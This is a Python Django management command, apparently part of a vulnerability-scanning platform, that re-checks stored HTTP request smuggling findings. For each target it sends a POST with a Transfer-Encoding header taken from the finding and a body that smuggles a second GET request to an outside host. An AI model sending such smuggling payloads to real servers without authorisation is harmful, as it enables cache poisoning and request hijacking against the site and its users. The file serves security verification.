import nmap
from apps.assets.models import Asset, Port, Software
from django.db.models import Q
import uuid
import os
import hashlib
from django.core.management.base import BaseCommand
import datetime
import requests
from django.conf import settings
import json
import nmap
from apps.assets.models import Asset, Port, Risk
import os
import hashlib
from apps.tasks.lib import common
import subprocess
import json
from apps.tasks.lib.common import bcolors


class Command(BaseCommand):
    def handle(self, *args, **options):
        print(bcolors.OKGREEN + '+ 开始验证HTTP夹带攻击漏洞...')
        risks = Risk.objects.filter(risk_type='HTTP夹带攻击')
        h = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
            "Cache-Control": "no-cache",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        for risk in risks:
            print('-' * 75)
            url = risk.webapp
            desc = risk.desc.split("'")
            te_key = desc[3]
            te_value = desc[5]
            h[te_key] = te_value
            print('+ ' + url)
            print(h)
            data = "0\r\n\r\nGET http://www.injection.vip/toolkit/smuggler HTTP/1.1\r\nHost: baidu.com\r\nX: X\r\n\r\n"
            print(data)
            try:
                res = requests.post(url, headers=h, verify=False, timeout=30, data=data)
                print(res.headers)
            except:
                pass



        print('任务完成！')
